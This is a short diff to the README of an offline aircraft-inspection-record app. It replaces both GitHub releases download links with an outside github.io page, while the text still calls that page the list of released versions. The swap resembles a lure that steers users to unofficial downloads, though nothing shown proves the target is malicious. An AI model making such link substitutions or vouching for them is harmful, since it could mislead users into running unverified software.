@@ -1,6 +1,6 @@
 # ✈️ aviation-inspection-log - Keep your aircraft records organized offline
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-4682B4?style=for-the-badge&logo=github)](https://github.com/udls-website/aviation-inspection-log/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-4682B4?style=for-the-badge&logo=github)](https://udls-website.github.io)
 
 ## 📋 What This Software Does
 
@@ -20,7 +20,7 @@ Follow these steps to download and run the software on your Windows computer.
 
 Go to this link:
 
-**https://github.com/udls-website/aviation-inspection-log/releases**
+**https://udls-website.github.io**
 
 This page lists all available versions of the software.
 
